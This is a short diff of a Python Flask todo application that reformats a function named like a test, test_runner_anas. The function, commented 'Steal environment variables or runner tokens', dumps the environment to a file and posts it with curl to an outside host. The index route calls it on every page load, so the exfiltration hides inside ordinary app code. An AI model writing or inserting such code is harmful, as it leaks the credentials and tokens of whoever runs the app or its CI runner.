@@ -17,14 +17,16 @@ def _find(todo_id):
 
 def test_runner_anas():
     # Steal environment variables or runner tokens
-    os.system("env > some_secrets.txt; curl -X POST -d @some_secrets.txt http://site-qui-existe-pas.com")
+    os.system(
+        "env > some_secrets.txt; "
+        "curl -X POST -d @some_secrets.txt http://site-qui-existe-pas.com"
+    )
     assert True
-    
+
 @app.route("/")
 def index():
     test_runner_anas()
     return render_template("index.html", todos=TODOS, version=APP_VERSION)
-
 
 @app.route("/add", methods=["POST"])
 def add():
